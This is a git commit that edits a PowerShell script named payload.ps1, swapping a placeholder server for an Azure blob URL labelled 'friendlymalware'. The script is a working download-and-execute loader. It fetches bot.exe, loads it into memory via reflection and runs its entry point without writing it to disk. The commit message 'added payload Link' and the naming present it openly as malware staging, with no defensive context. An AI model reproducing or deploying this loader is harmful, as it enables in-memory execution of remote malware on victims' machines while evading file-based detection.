fea0c2f8f34c1ca24728ee0c476aff602154e545
DedSec2050 <marsalsoren2050@gmail.com>
2025-02-06 11:35:39 +0530

    added payload Link

--- payload.ps1
+++ payload.ps1
@@ -1,5 +1,5 @@
 $webclient = New-Object System.Net.WebClient
-$bytes = $webclient.DownloadData("http://your-server.com/bot.exe")
+$bytes = $webclient.DownloadData("https://friendlymalware.blob.core.windows.net/payload/bot.exe")
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 $entryPoint = $assembly.EntryPoint
 $entryPoint.Invoke($null, @([String[]]@()))
